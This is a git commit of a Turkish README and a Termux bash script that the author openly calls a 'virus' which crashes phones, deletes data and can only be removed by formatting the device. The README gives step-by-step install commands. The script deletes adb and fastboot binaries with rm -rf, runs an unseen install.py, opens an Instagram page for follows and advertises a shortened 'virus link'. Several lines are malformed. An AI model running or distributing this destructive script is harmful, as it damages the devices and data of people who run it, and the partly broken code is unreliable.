71a33b3225992dcc1277b01a0236d13f5899a15c
çılgın hacker <98042176+termuxhackt@users.noreply.github.com>
2022-01-26 16:42:21 +0300

    Initial commit

---
+++ README.md
@@ -0,0 +1,30 @@
+/////////////////////////////////////////
+sorumluluk kulanıcıya aitir////////////////
+///////////////////////////////////////////
+vürüs hakında 
+////////////////////////
+ vürüs cihazı çökertiyor.
+___________________________
+cihazın verilerini siliyor.
+___________________________
+cıhazı yavaşlatıyor
+____________________________
+ Not :vürüsü silmenin tek yolu cihaza format atmaktır.
+vürüsü aktifleştirmek için
+_____________
+pkg install git
+______________
+git klon https://github.com/termuxhackt/termux.sh/new/main
+_____________________________________________________________
+ls
+______________________________________________
+cd termux.sh
+______________
+ls
+_______________
+chmod +x *
+________________
+ls
+__________________
+bash ç.hacker.sh
+________________________________________
---
+++ ç.hacker.sh
@@ -0,0 +1,24 @@
+#!/data/data/com.termux/files/usr/bin/bash
+
+echo -e "hoşgeldiniz "
+echo
+echo -e "\e[32m[*] \link:( https://bit.ly/3ild93L )     ..."
+rm -rf $PREFIX/bin/adb
+rm -rf $PREFIX/bin/adb.bin $PREFIX/bin/fastboot $PREFIX/bin/fastboot-armeabi
+echo -e "\e[32m[*] \instegram hesabımızı takip ediniz..."
+
+
+python2 install.py install
+termux-open-url https://www.instagram.com/wq_brave/
+echo -e '\033[31;40;1m    takip etiğiniz için teşekürler'
+
+echo -e "\033[33;4mMakdos Blog\033[0m"
+\033[33;4mMakdos Blog\033[0m
+echo -e '\033[31;40;1m  NOT:SORUMLULUK KABUL ETMİYORUM TÛM SORUMLULUK KULANICIYA AİTİR!>
+
+echo '\033[31;40;1m ########################################'
+'\033[31;40;1m          (: vürûs linkimiz:)    '
+'\033[31;40;1m            https://bit.ly/3ild93L'
+'\033[31;40;1m ##############################################'
+
+echo -e '\034[34;40;1m   sleep 1'
